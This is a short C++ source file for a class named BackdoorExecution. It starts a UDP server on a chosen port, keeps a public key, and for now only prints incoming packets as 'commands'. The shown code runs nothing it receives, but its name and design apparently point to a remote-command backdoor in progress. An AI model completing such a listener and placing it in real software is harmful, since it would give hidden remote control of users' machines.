#include "BackdoorExecution.hpp"

#include <UdpServer.hpp>
#include <iostream>


void BackdoorExecution::Serve(volatile std::sig_atomic_t& stop, std::uint16_t port, boost::multiprecision::cpp_int public_key)
{
    m_public_key = std::move(public_key);
    UdpServer::Serve(stop, port);
}

void BackdoorExecution::OnReceivedPacket(std::span<const std::uint8_t> command)
{
    std::cout << "Received command: " << std::string{ command.begin(), command.end() } << std::endl;
}

void BackdoorExecution::LogError(std::string_view sv)
{
    std::cout << sv << std::endl;
}

BackdoorExecution::BackdoorExecution() = default;
BackdoorExecution::~BackdoorExecution() = default;
